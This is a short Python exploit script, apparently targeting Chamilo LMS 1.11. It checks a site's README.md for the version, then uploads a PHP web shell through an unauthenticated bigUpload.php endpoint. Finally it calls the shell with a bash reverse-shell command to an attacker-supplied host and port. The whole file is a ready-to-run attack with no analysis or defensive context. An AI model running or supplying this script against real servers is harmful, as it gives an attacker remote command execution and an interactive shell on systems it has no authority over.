import requests
import sys
from urllib.parse import urljoin

if len(sys.argv) < 4:
    print("Usage: python3 exploit.py base_url lhost lport")
    sys.exit(1)

base_url = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]

vulnerable_url = f"{sys.argv[1]}/README.md"
response1 = requests.get(vulnerable_url)
content_of_response1 = response1.content.decode('utf-8')

#print(content_of_response1)

if "1.11" in content_of_response1:
    print("Target Vulnerable!")
else:
    print("Cannot find README.md or target is not vulnerable")

upload_url = urljoin(
    base_url,
    "/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
)

shell_name = "cmd.php"

with open(shell_name, "rb") as f:
    files = {
        "bigUploadFile": (shell_name, f, "application/x-php")
    }

    response2 = requests.post(upload_url, files=files)

shell_url = urljoin(
    base_url,
    f"/main/inc/lib/javascript/bigupload/files/{shell_name}"
)

response3 = requests.get(shell_url, params={"cmd": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"})
print(response3.text)
